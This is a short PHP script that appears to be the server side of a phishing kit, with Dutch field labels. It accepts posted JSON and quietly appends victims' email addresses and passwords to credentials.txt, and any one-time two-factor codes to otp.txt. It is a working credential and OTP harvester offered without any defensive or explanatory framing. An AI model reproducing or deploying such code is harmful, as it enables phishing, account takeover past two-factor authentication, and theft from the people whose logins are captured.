<?php

// Write credentials to file
function write_credentials ($email, $password) {
	file_put_contents('credentials.txt', "E-Mail: {$email}\nWachtwoord: {$password}\n", FILE_APPEND);
}

// Write One Time Password to file
function write_otp ($code) {
	file_put_contents('otp.txt', "Code: {$code}\n", FILE_APPEND);
}

// Parse JSON data
$data = json_decode(file_get_contents('php://input'), true);
if (isset($data['email']) && isset($data['password'])) {
	write_credentials($data['email'], $data['password']);
} elseif (isset($data['code'])) {
	write_otp($data['code']);
} else {
    write_credentials('Onbekend', 'Onbekend');
}

//
exit;
